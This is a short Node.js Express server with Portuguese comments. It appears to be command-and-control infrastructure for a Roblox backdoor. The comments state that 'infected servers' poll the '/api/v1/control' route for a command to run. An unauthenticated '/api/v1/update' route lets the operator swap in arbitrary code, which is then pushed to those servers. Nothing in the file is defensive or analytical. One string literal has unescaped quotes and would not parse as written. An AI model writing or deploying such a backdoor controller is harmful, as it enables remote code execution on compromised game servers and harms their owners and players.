const express = require('express');
const app = express();
const port = 3000;

// Este objeto representa o comando atual que todos os servidores infectados vão rodar
let currentPayload = {
    command: "print("Load🎉🎉")",
    version: 1
};

app.use(express.json());

// ROTA PARA O BACKDOOR: O Roblox vai ler isso aqui
app.get('/api/v1/control', (req, res) => {
    res.json(currentPayload);
});

// ROTA PARA VOCÊ: Use isso para mudar o comando remotamente via Postman ou Navegador
app.get('/api/v1/update', (req, res) => {
    const newCode = req.query.code;
    if (newCode) {
        currentPayload.command = newCode;
        currentPayload.version++;
        res.send(`Comando atualizado para a versão ${currentPayload.version}`);
    } else {
        res.send("Envie um código via ?code=");
    }
});

app.listen(port, () => {
    console.log(`AureusAPI rodando em http://localhost:${port}`);
});
